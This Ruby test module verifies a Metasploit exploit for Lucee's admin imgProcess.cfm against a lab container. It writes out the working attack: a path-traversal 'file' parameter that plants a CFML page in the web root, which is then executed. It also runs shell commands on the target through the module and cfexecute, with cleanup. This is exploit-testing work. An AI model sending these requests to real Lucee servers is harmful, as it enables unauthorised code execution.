# frozen_string_literal: true

require 'pathname'
require_relative '../laravel/commands'

# Independent CFML producers and physical target state gate real Lucee owners.
module LuceeTarget
  include LaravelCommandTarget

  JAR_SHA256 = '0a17b6c6c647959eabcb96245b4fb6ab3d5dc0a86462b55d83510f0f18aa7932'

  def laravel_component
    'lucee'
  end

  def laravel_owner
    'exploit/linux/http/lucee_admin_imgprocess_file_write'
  end

  def lucee_http(label, path, form = nil)
    endpoint = target_endpoint('target')
    client = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    client.open_timeout = 5
    client.read_timeout = 30
    response = client.start do |connection|
      request = form ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
      request.set_form_data(form) if form
      connection.request(request)
    end
    @rc[:http] << { label: label, path: path, form: form, code: response.code.to_i, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.b) }
    rc_save
    response
  end

  def native(mode, data, label)
    response = lucee_http(label, '/module-target-native.cfm', { 'mode' => mode }.merge(data.transform_keys(&:to_s)))
    expect(response.code).to eq('200'), response.body
    value = JSON.parse(response.body).transform_keys(&:downcase)
    @rc[:native] << { label: label, mode: mode, input: data, value: value }
    rc_save
    value
  end

  def native_verify(label)
    value = native('verify', {}, label)
    expect(value).to eq(JSON.parse(File.read('test/module_targets/lucee/installed-5.3.7.43.json')))
    output, = rc_command(label + '-vendor-jar', 'target', 'sha256sum', '/usr/local/tomcat/lucee/lucee.jar')
    expect(output.split.first).to eq(JAR_SHA256)
    value
  end

  def controlled_path(path)
    canonical = Pathname.new(path).cleanpath.to_s
    temporary = canonical.match?(%r{\A/tmp/module-target-lucee-[a-z0-9_-]+\z})
    cfml = canonical.match?(%r{\A(?:/opt/lucee/web/context|/var/www)/(?:module_target_lucee_[a-z0-9_]+|[A-Za-z0-9]{8,16})\.cfm\z})
    raise ArgumentError, 'Unexpected Lucee proof path' unless temporary || cfml

    canonical
  end

  def file(path)
    path = controlled_path(path)
    _, status = rc_command('proof-exists', 'target', 'test', '-e', path, required: false)
    expect([0, 1]).to include(status)
    value = if status == 1
              { 'exists' => false }
            else
              content, = rc_command('proof-bytes', 'target', 'cat', '--', path)
              uid, = rc_command('proof-uid', 'target', 'stat', '-c', '%u', '--', path)
              { 'exists' => true, 'uid' => Integer(uid, 10), 'base64' => Base64.strict_encode64(content.b) }
            end
    (@rc[:files] ||= []) << { path: path, value: value }
    rc_save
    value
  end

  def remove_file(path)
    path = controlled_path(path)
    rc_command('remove-proof', 'target', 'rm', '-f', '--', path)
    expect(file(path)).to eq('exists' => false)
  end

  def native_control(command, path, content)
    marker = 'lucee-native-' + @rc.fetch(:controls).length.to_s
    controlled = 'echo ' + marker + '; ' + command
    expected = { 'exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(content.b) }
    expect(file(path)).to eq('exists' => false)
    output, = rc_command('native-bash-command', 'target', '/bin/bash', '-c', controlled)
    expect(output).to eq(marker + "\n")
    local = file(path)
    expect(local).to eq(expected)
    remove_file(path)
    evaluated = native('execute', { command_base64: Base64.strict_encode64(controlled.b) }, 'native-cfexecute')
    expect(Base64.strict_decode64(evaluated.fetch('output_base64'))).to eq(marker + "\n")
    expect(Base64.strict_decode64(evaluated.fetch('errors_base64'))).to eq('')
    remote = file(path)
    @rc[:controls] << { path: path, marker: marker, command_base64: Base64.strict_encode64(command.b), content_base64: Base64.strict_encode64(content.b), local: local, remote: remote, evaluated: evaluated }
    expect(remote).to eq(expected)
  ensure
    primary = $ERROR_INFO
    begin
      remove_file(path) if path
    rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
      (@rc[:cleanup_errors] ||= []) << { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def remove_image_directory
    path = '/opt/lucee/web/temp/admin-ext-thumbnails/__/'
    _, status = rc_command('image-directory-exists', 'target', 'test', '-d', path, required: false)
    expect([0, 1]).to include(status)
    rc_command('remove-image-directory', 'target', 'rmdir', '--', path) if status.zero?
    _, status = rc_command('image-directory-absent', 'target', 'test', '-e', path, required: false)
    expect(status).to eq(1)
  end

  def native_image_write
    filename = "module_target_lucee_native_#{Process.pid}.cfm"
    path = '/opt/lucee/web/context/' + filename
    source = '<cfoutput>lucee-native-image-write</cfoutput>'
    expect(file(path)).to eq('exists' => false)
    response = lucee_http('native-image-base', '/lucee/admin/imgProcess.cfm?file=/.', 'imgSrc' => '')
    expect(response.code).to eq('500')
    expect(response.body).to include('file [/opt/lucee/web/temp/admin-ext-thumbnails/__/.]')
    response = lucee_http('native-image-write', '/lucee/admin/imgProcess.cfm?' + URI.encode_www_form('file' => '/../../../context/' + filename), 'imgSrc' => source)
    expect(response.code).to eq('200')
    physical = file(path)
    expect(physical).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(source + "\n"))
    response = lucee_http('native-image-execute', '/lucee/' + filename)
    expect(response.code).to eq('200')
    expect(response.body.strip).to eq('lucee-native-image-write')
    @rc[:image_write] = { path: path, source_base64: Base64.strict_encode64(source), proof: physical, executed: true }
  ensure
    remove_file(path) if path
    remove_image_directory
    rc_save
  end

  def owner_commands(kind, content)
    2.times do |iteration|
      path = "/tmp/module-target-lucee-owner-#{Process.pid}-#{kind}-#{iteration}"
      command = 'printf %s ' + Shellwords.escape(content) + ' >> ' + path
      native_control(command, path, content)
      console_command('back') if iteration.zero?
      console_command('use ' + laravel_owner) if iteration.zero?
      rc_json("begin;active_module.datastore['CMD']=#{command.inspect};true;end")
      offset = rc_json('framework.instance_variable_get(:@lucee_events).length')
      options = { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'AutoCheck' => iteration.zero?, 'ForceExploit' => false, 'AllowNoCleanup' => true, 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'HttpClientTimeout' => 15 }
      output = run_target_module(laravel_owner, 'target', options, action: 'run -z', reuse_module: true, allow_errors: true)
      selection = rc_json('active_module.object_id')
      expect(selection).to eq(@selected_owner) if iteration.positive?
      @selected_owner = selection
      events = rc_json("framework.instance_variable_get(:@lucee_events).drop(#{offset})")
      physical = rc_poll(5) do
        value = file(path)
        value if value.fetch('exists')
      end
      writes = events.select { |row| row['event'] == 'call' && row['method'] == 'write_file' && row['name'].end_with?('.cfm') }
      @rc[:calls] << { kind: kind, iteration: iteration, options: options, command_base64: Base64.strict_encode64(command.b), output: output, selection: selection, events: events, proof: physical }
      rc_save
      expect(physical).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(content.b))
      expect(writes.length).to eq(1)
      stub = '/opt/lucee/web/context/' + File.basename(writes.first.fetch('name'))
      actual_stub = file(stub)
      expect(actual_stub).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(Base64.strict_decode64(writes.first.fetch('contents_base64')) + "\n"))
      @rc[:calls].last[:stub] = { path: stub, proof: actual_stub }
      expect(events.filter_map { |row| row['check'] }).to eq(iteration.zero? ? [{ 'code' => 'appears', 'reason' => 'Lucee Administrator imgProcess.cfm detected.' }] : [])
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
    ensure
      primary = $ERROR_INFO
      begin
        cleanup_events = rc_json("framework.instance_variable_get(:@lucee_events).drop(#{offset || 0})")
        cleanup_events.select { |row| row['event'] == 'call' && row['method'] == 'write_file' && row['name'].end_with?('.cfm') }.each do |row|
          remove_file('/opt/lucee/web/context/' + File.basename(row.fetch('name')))
        end
        remove_file(path) if path
        remove_image_directory
      rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
        (@rc[:cleanup_errors] ||= []) << { type: e.class.name, message: e.message }
        raise unless primary
      ensure
        rc_save
      end
    end
  end
end
